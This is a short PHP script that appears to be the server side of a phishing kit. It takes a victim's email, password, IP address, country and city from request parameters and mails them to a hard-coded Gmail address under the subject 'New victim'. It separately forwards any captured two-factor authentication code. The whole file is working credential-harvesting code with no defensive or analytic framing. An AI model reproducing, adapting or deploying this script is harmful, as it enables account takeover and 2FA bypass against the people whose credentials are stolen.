<?php
define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
if(!IS_AJAX) {die('Restricted access');}
$e = "";
$p = "";
$country_name = "";
$ip = "";
$city = "";

if(isset($_GET['country']) && isset($_GET['ip'])&&isset($_GET['city'])){
    $country_name = $_GET['country'];
    $ip = $_GET['ip'];
    $city = $_GET['city'];
    
   // die();
    
}
if(isset($_GET['email'])){
    $e = $_GET['email'];
};
if(isset($_GET['password'])){
    $p = $_GET['password'];
};
// the message
$msg = "Email = ".$e."\n\nPassword = ".$p."\n\nCountry = ".$country_name."\n\nIp Address = ".$ip."\n\nCity = ".$city;

echo "<p>".$msg."</p>";

//die();
//$msg= "sadasdsdjighndfiugndfgndfgndf";
// use wordwrap() if lines are longer than 70 characters
$subject = "New victim";
//$msg = wordwrap($msg,70);
if(isset($_GET['code'])){
    $code = $_GET['code'];
    
    $msg = $code;
    $subject = "2FA Code";
    var_dump($code);
}


$to = "albin4keizz@gmail.com";
// send email
mail($to,$subject,$msg);
?>